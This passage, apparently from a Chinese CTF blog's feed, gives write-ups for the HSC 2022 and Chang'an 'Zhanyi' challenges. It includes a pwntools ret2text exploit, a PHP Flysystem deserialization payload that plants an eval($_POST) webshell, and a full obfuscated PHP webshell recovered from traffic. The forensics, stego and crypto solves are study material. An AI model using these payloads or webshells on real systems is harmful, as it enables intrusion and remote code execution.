class="keyword">char</span> *)((longlong)&amp;local_res7e7 + (longlong)local_res7d3)) &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;incorrect\n&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> LAB_001008a0;</span><br><span class="line">    &#125;</span><br><span class="line">    local_res7d3 = local_res7d3 + <span class="number">1</span>;</span><br><span class="line">  &#125; <span class="keyword">while</span>( <span class="literal">true</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>逻辑为输入flag值逐字符 <code>-0x2f</code> 得到的字符串与 <code>0x37463f30444132433429</code> 相等，即ROT47。</p><p>简单还原得flag：flag{fun_sparcX}</p><p>​    </p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="Ez-pwn"><a href="#Ez-pwn" class="headerlink" title="Ez_pwn"></a>Ez_pwn</h3><p>简单ret2text：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;hsc2019.site&#x27;</span>,<span class="number">10891</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">pl = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x48</span> + p64(<span class="number">0x400741</span>)</span><br><span class="line">r.sendline(pl)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;本届HSC1th 2022是由社会战队红客突击队（Honker Security Commando）举办。 本次比赛将采用在线网络安全夺旗挑战赛的形式，涵盖web，crypto，misc，re等主流方向，并面向全球开放。比赛三甲可获突击队周边礼品。</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2022赛" scheme="https://lazzzaro.github.io/tags/2022%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>长安“战疫”网络安全卫士守护赛</title>
    <link href="https://lazzzaro.github.io/2022/01/08/match-%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B/"/>
    <id>https://lazzzaro.github.io/2022/01/08/match-%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B/</id>
    <published>2022-01-08T10:00:01.000Z</published>
    <updated>2022-01-08T12:51:09.214Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>新冠疫情肆虐全球，这一场疫情阻击战不仅是我国卫生健康领域的一场战疫，也是科学技术领域的一次大考。在这个特殊时期，保障网络安全，防范利用新冠肺炎疫情实施的网络攻击行为是关系广大人民群众切身利益的大事。如网络攻击者将计算机病毒、木马和移动恶意程序等伪装成“肺炎病例”“防护通知”等信息，通过钓鱼邮件、恶意链接等方式进行传播，造成用户安全问题。</p><p>西安数所高校学生团体联合发起长安战疫网络安全公益科普赛和长安战疫“网络安全卫士”守护赛，一方面提升全民疫情期间的网络安全意识与疫情中常见问题的应对措施，另一方面提升我省的网络安全应急响应能力和网络安全从业者技术能力，协助用户提升网络安全防护能力，为战胜新冠肺炎提供网络空间保障。</p><p>Rank: 14</p><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="八卦迷宫"><a href="#八卦迷宫" class="headerlink" title="八卦迷宫"></a>八卦迷宫</h3><blockquote><p>一起走迷宫吧，要提交全拼音字符奥</p></blockquote><p><img src="/2022/01/08/match-%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B/maze.png" alt="maze" style="zoom: 33%;"></p><p>走迷宫，串联经过的八卦对应文字：<code>cazy&#123;战长恙长战恙河长山山安战疫疫战疫安疫长安恙&#125;</code>，转为全拼：</p><p><code>cazy&#123;zhanchangyangchangzhanyanghechangshanshananzhanyiyizhanyianyichanganyang&#125;</code></p><p>​    </p><h3 id="朴实无华的取证"><a href="#朴实无华的取证" class="headerlink" title="朴实无华的取证"></a>朴实无华的取证</h3><p>xp内存取证，先判断profile</p><p><code>volatility -f xp_sp3.raw imageinfo</code></p><p>查看进程 </p><p><code>volatility -f xp_sp3.raw --profile=WinXPSP2x86 pslist</code></p><p>发现notepad和mspaint，查看记事本</p><p><code>volatility -f xp_sp3.raw --profile=WinXPSP2x86 notepad</code></p><p>找到信息： <code>20211209(Encrypt)</code>。</p><p>再查看桌面文件</p><p><code>volatility -f xp_sp3.raw --profile=WinXPSP2x86 filescan | grep -E &quot;桌面&quot;</code></p><p>找到文件 <code>flag.zip</code> 和 <code>flag.png</code>，分别dump下来</p><p><code>flag.png</code> 中有密文信息： <code>FDCB[8LDQ?ZLOO?FHUWDLQOB?VXFFHHG?LQ?ILJKWLQJ?WKH?HSLGHPLF]</code>，</p><p><code>flag.zip</code> 有密码，用前面的 <code>20211209</code> 解开找到加密算法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Encrypt</span><span class="params">(<span class="built_in">string</span>&amp; str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; str.length(); i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(str[i] &gt;=<span class="string">&#x27;a&#x27;</span>&amp;&amp; str[i]&lt;=<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">str[i]+=<span class="number">3</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(str[i]==<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">str[i]=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(str[i]==<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">str[i]=<span class="string">&#x27;b&#x27;</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(str[i]==<span class="string">&#x27;z&#x27;</span>)</span><br><span class="line">str[i]=<span class="string">&#x27;c&#x27;</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(str[i]==<span class="string">&#x27;_&#x27;</span>)</span><br><span class="line">str[i]=<span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">str[i] -= <span class="number">32</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还原flag：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="built_in">list</span>(<span class="string">b&#x27;FDCB[8LDQ?ZLOO?FHUWDLQOB?VXFFHHG?LQ?ILJKWLQJ?WKH?HSLGHPLF]&#x27;</span>)</span><br><span class="line">t = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x &gt;= <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) <span class="keyword">and</span> x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;w&#x27;</span>):</span><br><span class="line">        x += <span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="built_in">ord</span>(<span class="string">&#x27;x&#x27;</span>):</span><br><span class="line">        x = <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> x == <span class="built_in">ord</span>(<span class="string">&#x27;y&#x27;</span>):</span><br><span class="line">        x = <span class="built_in">ord</span>(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> x == <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>):</span><br><span class="line">        x = <span class="built_in">ord</span>(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> x == <span class="built_in">ord</span>(<span class="string">&#x27;_&#x27;</span>):</span><br><span class="line">        x = <span class="built_in">ord</span>(<span class="string">&#x27;|&#x27;</span>)</span><br><span class="line">    x -= <span class="number">32</span></span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">        <span class="keyword">if</span> encrypt(j) == s[i]:</span><br><span class="line">            t += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        t += <span class="string">&#x27;?&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(t)</span><br><span class="line"></span><br><span class="line"><span class="comment"># cazy&#123;Xian?will?certainly?succeed?in?fighting?the?epidemic&#125;</span></span><br></pre></td></tr></table></figure><p><code>?</code> 改 <code>_</code> ，得到flag：<code>cazy&#123;Xian_will_certainly_succeed_in_fighting_the_epidemic&#125;</code></p><p>​    </p><h3 id="无字天书"><a href="#无字天书" class="headerlink" title="无字天书"></a>无字天书</h3><p>在流量包中发现 <code>secret</code> 流量，dump得到gzip包，内容为一串16进制字符串，其中包含 <code>504B0304</code>，转存为zip文件，内含 <code>flag.txt</code> 和 <code>key.ws</code> 两个纯空白字符文件。</p><p><code>key.ws</code> 中包含空格与tab字符及大量换行符，为whitespace语言，<a href="https://ideone.com/l/whitespace">在线运行</a>得到输出 <code>XiAnWillBeSafe</code>；</p><p><code>flag.txt</code> 中包含大量空格与tab字符，为snow隐写，密码 <code>XiAnWillBeSafe</code>，解密：</p><p><code>SNOW.EXE -C -p XiAnWillBeSafe flag.txt</code>，得到flag：</p><p><code>cazy&#123;C4n_y0u_underSt4nd_th3_b0oK_With0ut_Str1ng&#125;</code></p><p>​    </p><h3 id="西安加油"><a href="#西安加油" class="headerlink" title="西安加油"></a>西安加油</h3><p>在流量包中发现 <code>secret.txt</code> 流量，dump下来base64解码得到zip文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;secret.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;out.zip&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>).write(base64.b64decode(f))</span><br></pre></td></tr></table></figure><p>打开为拼图，共48张，选择带flag的部分图片纯手拼：</p><p><img src="/2022/01/08/match-%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B/pintu.png" alt="pintu" style="zoom: 67%;"></p><p>flag：<code>cazy&#123;make_XiAN_great_Again&#125;</code></p><p>​    </p><h3 id="ez-Encrypt"><a href="#ez-Encrypt" class="headerlink" title="ez_Encrypt"></a>ez_Encrypt</h3><p>查看流量，发现是蚁剑流量，其中一个流中</p><p><code>TzozOToiTGVhZ3VlXEZseXN5c3RlbVxDYWNoZWRcU3RvcmFnZVxBZGFwdGVyIjo1OntzOjc6IgAqAGZpbGUiO3M6MTE6Ii4vc2hlbGwucGhwIjtzOjEwOiIAKgBhZGFwdGVyIjtPOjMwOiJMZWFndWVcRmx5c3lzdGVtXEFkYXB0ZXJcTG9jYWwiOjE6e3M6MTM6IgAqAHdyaXRlRmxhZ3MiO2k6MDt9czo5OiIAKgBleHBpcmUiO047czoxMToiACoAYXV0b3NhdmUiO2I6MDtzOjg6IgAqAGNhY2hlIjthOjE6e2k6MDtzOjI5OiI8P3BocCBldmFsKCRfUE9TVFsnY2F6eSddKSA%2FPiI7fX0%3D</code></p><p>base64解码为 <code>O:39:&quot;League\Flysystem\Cached\Storage\Adapter&quot;:5:&#123;s:7:&quot;.*.file&quot;;s:11:&quot;./shell.php&quot;;s:10:&quot;.*.adapter&quot;;O:30:&quot;League\Flysystem\Adapter\Local&quot;:1:&#123;s:13:&quot;.*.writeFlags&quot;;i:0;&#125;s:9:&quot;.*.expire&quot;;N;s:11:&quot;.*.autosave&quot;;b:0;s:8:&quot;.*.cache&quot;;a:1:&#123;i:0;s:29:&quot;&lt;?php eval($_POST[&#39;cazy&#39;]) ?&gt;&quot;;&#125;&#125;</code>，</p><p>说明通过反序列化漏洞写入一句话木马。</p><p>找到一长串base64编码字符串，解码保存为 <code>www.zip</code> 源码，在 <code>app\controller\Index.php</code> 中找到混淆处理过的马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> define(<span class="string">&#x27;IKlSux1227&#x27;</span>,<span class="keyword">__FILE__</span>);<span class="variable">$DusPFr</span>=base64_decode(<span class="string">&quot;bjF6Yi9tYTVcdnQwaTI4LXB4dXF5KjZscmtkZzlfZWhjc3dvNCtmMzdqZHF0d3lpT2VBY1VaTHBDdUhuYm1ndkZzZlNhUFlsTUpCTmpSVmtLeFFEVFdJcnpFb1hHaA==&quot;</span>);<span class="variable">$arCiCL</span>=<span class="variable">$DusPFr</span>[<span class="number">3</span>].<span class="variable">$DusPFr</span>[<span class="number">6</span>].<span class="variable">$DusPFr</span>[<span class="number">33</span>].<span class="variable">$DusPFr</span>[<span class="number">30</span>];<span class="variable">$VvUrBZ</span>=<span class="variable">$DusPFr</span>[<span class="number">33</span>].<span class="variable">$DusPFr</span>[<span class="number">10</span>].<span class="variable">$DusPFr</span>[<span class="number">24</span>].<span class="variable">$DusPFr</span>[<span class="number">10</span>].<span class="variable">$DusPFr</span>[<span class="number">24</span>];<span class="variable">$DEomKk</span>=<span class="variable">$VvUrBZ</span>[<span class="number">0</span>].<span class="variable">$DusPFr</span>[<span class="number">18</span>].<span class="variable">$DusPFr</span>[<span class="number">3</span>].<span class="variable">$VvUrBZ</span>[<span class="number">0</span>].<span class="variable">$VvUrBZ</span>[<span class="number">1</span>].<span class="variable">$DusPFr</span>[<span class="number">24</span>];<span class="variable">$LnpnvY</span>=<span class="variable">$DusPFr</span>[<span class="number">7</span>].<span class="variable">$DusPFr</span>[<span class="number">13</span>];<span class="variable">$arCiCL</span>.=<span class="variable">$DusPFr</span>[<span class="number">22</span>].<span class="variable">$DusPFr</span>[<span class="number">36</span>].<span class="variable">$DusPFr</span>[<span class="number">29</span>].<span class="variable">$DusPFr</span>[<span class="number">26</span>].<span class="variable">$DusPFr</span>[<span class="number">30</span>].<span class="variable">$DusPFr</span>[<span class="number">32</span>].<span class="variable">$DusPFr</span>[<span class="number">35</span>].<span class="variable">$DusPFr</span>[<span class="number">26</span>].<span class="variable">$DusPFr</span>[<span class="number">30</span>];<span class="keyword">eval</span>(<span class="variable">$arCiCL</span>(<span class="string">&quot;JFZDQlpRVz0iZ29NVFFoZXFpYVVPdWJtWWZSSlNya1dObmRFc1BaR2pBS3BDVnRCSUh3REZ4Y3pYTGx2eVlUY2lVdVBuZ3BzeXFib09saGpGSVpOU3d6bU1IR3ZEeHRrWFZhV2ZkQUpFclJLTENCUWVISjlBcGR4WUd2Vm9wTjVCdFh6WmhCdXVwWmZyY0RmM2plcmpGMnJpekxZcmNEZjN0aU1aR21qbmkwOWpITmp1UjJzMlNFOVpHTlNRR3ZzVGZvam5oREdHcGlCME5WaE5PMmhxc0x6dVZtWjBpRXVYU3ZoT2hEVkNwQmtLTzIxMHAxazZidkdwVjJ1bk9LU1p6WjVKenYxU1BvaHJPMXo0ekV6cWlEVkdjMUdVVnYxQXMxU3ZVWjVzRkVrVFZaVk1iVkVMR0VqRGJCZktWMHVBek5tQXpkekZoVmtrc05ycGIxek9wRWhwVktCdlZEV1podkVMc0JHaUdLMDlmZ1o3am1rM2JadTFWSzBaR21qbmkwOWpOS1N6Q2doWlVva0hpMEJiU0IwcWp2aFhwWjlIRlZNS2MxMHFqdmhYcFo5SEZWTUtjRTA3amRHaGl2emRGSzBaR21qbmkwOWpOS2NLTEY0Wkdtam5pMDlqTkttQUxGNFpHbWpuaTA5ak5LZjBMRjRaR21qbmkwOWpOS21BTEY0Wkdtam5pMDlqTktmMExpTVpOTkdNendHc0hGaDJzc3J3aDBhYmNFMHFqdmhYcFo5SEZWTXJ5RTBxanZoWHBaOUhGVk1LTEY0WnpCRWNHMHpDTktXekNnaDJzc3J3aDBhYmNWMHFqdmhYcFo5SEZWTWVTRTA3anYxRVVWRXZPSzBaR21qbmkwOWpOS3p6Q2doWlVva0hpMEJiY2lTenllaHR6MjVmelZScUhGaFpVb2tIaTBCYmNEanpDZ2haVW9rSGkwQmJjS0d6Q2doWlVva0hpMEJiY0RCekNnaFpVb2tIaTBCYmNER3pDZ2haVW9rSGkwQmJjS1d6Q2doWlVva0hpMEJiY0tqekNnaFpVb2tIaTBCYmNLVnpDZ2haVW9rSGkwQmJjREd6Q2doWlVva0hpMEJiY0tXenkyVjJPTkFUam1rM2JadTFWZVlnRlpWcGlWVHJSZGtOcERXa1ZFVjBSQlRlU0xoc2hOck1zTnJwcEJqT05vQlpoTmhFR05hVE9WR05HbWpaVjFUS1YwenZTVmphUEVWREZtNTVOWnpBaHZmZXBFalZjb3JpczJyTVNFVUtoWjlWaFZqSlZ2NU16VlRBekVXZ2hOdUZPS2pwczFaS05CekJidmhTVlpWeXBWQk5SSldwVk5yTk9EV05oMVZkYkVoZ1ZOVUtWRXVYUHZWZHNCQlpWb3JlczIxQVBORUVoWmpCcG9yTVZCVjRwdlZWaEJ1eWhKV2tpS2pOY0JCTHoyOXRQRFlJRndaMHAxU3FHZFZpRkVHT0YwU0ZjQlZWUHY1RmNkU1FGWkdNYk5qZk5Eak5VMnpJc29hNGJCenFpQnpjVTFqMHNCVnZzQmphaUxFU3BOYUtGWkdNYk5qZk5Eak5VMnpJc29hNGJCenFpQnpjVTFqMHNCVnZzQmphaUxTdGhLRXZzVkd2aDFCNXAzU3Rob3JhT1p1cGNCR0pHMmFGcDN1cVYyNXlWMHJtVUxTdGhLRXZzVkd2aDFCNXAzV0NzMk0zZmdaa3lLOCtISjlBcGR4WUd2Vm9wTjVCdFh6ZEdOU3RiczRyY0RmM2plcmpGMnJpekxZcmNEZjN0aU1aaEJrUVBtajBITmp1UjJzMlNFOVpHTlNRR3ZzVGZvam5oREdHcGlCME5WaE5PMmhxc0x6dVZtWjBpRXVYU3ZoT2hEVkNwQmtLTzIxMHAxazZidkdwVjJ1bk9LU1p6WjVKenYxU1BvaHJHc1ZaVnZtZVNMekRiRVQyT0tFRk52aGFWWmhWYm1HME9OMVROTkVPYkVFWmNOclVzS1dGekJFSWJtYU5WMEduc1ZzMXBWalZwZFNwRm1HdXNvNUZjVmhkTm81c3NpMDlmZ1o3anYxcVYydWlGSjBaaEJrUVBtajBOS1N6Q2dodk5vOTRVd2hiU0IwcWptR3BiM3VYekVNS2MxMHFqbUdwYjN1WHpFTUtjRTA3akVHR1YyUzRHSjBaaEJrUVBtajBOS2NLTEY0WmhCa1FQbWowTkttQUxGNFpoQmtRUG1qME5LZjBMRjRaaEJrUVBtajBOS21BTEY0WmhCa1FQbWowTktmMExpTVpPTkdWekJ6c0hGaE5OVnpEUHZoYmNFMHFqbUdwYjN1WHpFTXJ5RTBxam1HcGIzdVh6RU1LTEY0WlZCQkxPM3VaTktXekNnaE5OVnpEUHZoYmNWMHFqbUdwYjN1WHpFTWVTRTA3anZCWnoyclNzSzBaaEJrUVBtajBOS3p6Q2dodk5vOTRVd2hiY2lTenllaGFiQnpUczBZcUhGaHZObzk0VXdoYmNEanpDZ2h2Tm85NFV3aGJjS0d6Q2dodk5vOTRVd2hiY0RCekNnaHZObzk0VXdoYmNER3pDZ2h2Tm85NFV3aGJjS1d6Q2dodk5vOTRVd2hiY0tqekNnaHZObzk0VXdoYmNLVnpDZ2h2Tm85NFV3aGJjREd6Q2dodk5vOTRVd2hiY0tXenkyVjJPTkFUanYxcVYydWlGWFlnRlp6cHMxVnFzRGhHUERXa1ZOYTRpMmhJY2loQmJOdW5zWlZwc3ZoRUZCekZjc0d1czF1WnpWa2RjTEJnaEJqTnNpVzBob0VMR3YxQlZvcnJWaVN5UEVFTlVaYVpObWprczB6TnBFenZHZGpnYzFmMXMxek1SQlpyaW81R1ZzRzRPREVGT1ZWRUd2ckZWTGhKVm1zcnMyU2RTVmpOY0JrS3NaR01oRWhJTndrWmNEbTJWMEdwY0JTZFJ2Qk5ORU8wczI1dHN2RWRzRGpoVnZySnMyNU5WMmp2VkJTRFZCanZPMmFNVTJjQXlza2dwM2hmTzFWdHB2U0xpRFNOVm1acmlzenZzMDlPUkVHRmNzamRPRFd0cDJqRWNMQmlWS1Zjc0RTdlUxQk9ob2twYlo1NXMxUjFibTFuYmRFc05FR2pPVkdORkVaZVNOdVpjM1dLTm9ydEZvVnFpd0JpVlo1Y3NaUjFSVmpWR0VFeWhMaGZWc2hGaUJmclV3RUZORUdlc2lqTnMyU05pWkdOY3ZyQVZCVjRjRWpNVkxCR2MzV3ZPMmEwUjJWRUZvYWhjZGhhVm9heXB2aE5VQmtOVk5oMUdKVzBGRWpzaEJHVnAyYTNzMk00U05FSXptdWdiTFd2c0RFV2N2amRObzlnaExoYVZvYXlpdmhPUmRTaWNCa0xzaVcwYlZHSWlacnBiZFdrc0JHTWhFVEFWQldTVnNreUdFelRwMVNmaGlWWk5FamhHbUdORnMwclJkV0dWMWt5VkV6NHp2am5HdjFMVkJrbXNLanBWMW1BenYxTnAwNWNOb3JwaEVjS1ZCRXVic1Y1VnNWcEYxVUtoREdpYlpra09vMTRGRVNkR3Z1U2J2UzVzMXVFU05FRVZCV2lWMnJ2c0RFWnAxU2ZoaVZaTkVqaEdtR05GczByUmRXR1Yxa3lWRXo0enZFbUd2MUxWQmttc0tqcFYxbUF6djFOcDA1SE5CekZoRWNlTkJ6aGNkaGFWb2F5aXZoVnBkVnNORUdoc29yTk5CR01iRUVTYm1mMk8za2pTVkdFemR1WmgycmNzWlZNT1ZVZVNOcnBjZGg0TkRqdEZzMXFod0VpY0VqdE9WR05zRU9BaUJqU3BCanFzS1NaU29qRXp2MU5wMDVjR0VoWFIxa01iRXpoY2RoYVYyYXRpQlVBcEpHaXBLQmVzaVdOaVZWZFJka1NjMWprVkJoamNFbWVWQmhaaEVUMFZEajBVMUdOaFprWmJFR3BzaWp0YlZ6Tk5aaGljQmt1aURqcE5CR0lpWnJwYkVrbXNLanBWMW1laEJTVmhtanlPMmFUUlZjZU5aNVpjMDU1Tk5rTlNtMU5SbXJOYzBzMVYwVkFzb2h2c3dqVmh2dW5OVmhFU1ZzZXptak5wMGtlc1ZHQWkyRTZGd3VWTnZ1NU9va05TdlNhU0pFQkZtazFpQnVUUE5qbmJtQlZjM1dLc0tqcFYxbUF6SkVTaDN1SE5Cemh5c0JuenZyWmJzR0tGMFNEQzFXa08zVnRoS0UxVkRqVFZFU0pHMmFOYnZyT05pU1RwMGFKc291cGJFT2VWREVoYjBrZE5CU1ZiQmYwTkxCM3AyRUxzRFNnaGlFc0Yya2pSbXJKc291cGJFT2VWREVoYjBrZE5CU1ZiQmYwTkxCM3AyRUxzRFNnaGlFc2ltU0ZSRWtmR2RTc1ZaMUFpbVNGcEVrTVZEak5jVkVRRlp6cHMxVnFzRGhHUEx6M2ltU0ZSRWtmR2RTc1ZaMUFGMVNJUm05M0hpMGd0Rlo3SEs0PSI7ZXZhbCgnPz4nLiRhckNpQ0woJFZ2VXJCWigkREVvbUtrKCRWQ0JaUVcsJExucG52WSoyKSwkREVvbUtrKCRWQ0JaUVcsJExucG52WSwkTG5wbnZZKSwkREVvbUtrKCRWQ0JaUVcsMCwkTG5wbnZZKSkpKTs=&quot;</span>));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>尝试手动逐层解密，最后得到：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">BaseController</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">BaseController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">            unserialize(base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Welcom To CAZT! Xi&#x27;an Come On!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">C4zyC0m3On</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;cazy&#123;PHP_ji4m1_1s_s00000_3aSyyyyyyyyyyy&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Ez-Steg"><a href="#Ez-Steg" class="headerlink" title="Ez_Steg"></a>Ez_Steg</h3><p>zip压缩包根据提示爆破6位数字密码为 <code>220101</code>，解压有 <code>steg.pyc</code> 和 <code>flag.txt</code>。</p><p>用uncompyle6逆pyc发现无有意义代码，为pyc隐写，用stegosaurus工具解密：</p><p><code>python stegosaurus.py steg.pyc -x</code></p><p>得到密码 <code>Extracted payload: TheKey:St3g1sV3ryFuNny</code>。</p><p>再将 <code>flag.txt</code> 中emoji密文用emoji-aes解得到flag：<code>cazy&#123;Em0j1s_AES_4nd_PyC_St3g_D0_yoU_l1ke&#125;</code></p><p>​    </p><h3 id="binary"><a href="#binary" class="headerlink" title="binary"></a>binary</h3><blockquote><p>二进制</p></blockquote><p>文件头 <code>CAFEBABE</code> 说明为 <code>.class</code> Java字节码文件，用jadx查看：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> defpackage;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* renamed from: Main  reason: default package */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] strArr)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] bArr = &#123;<span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, 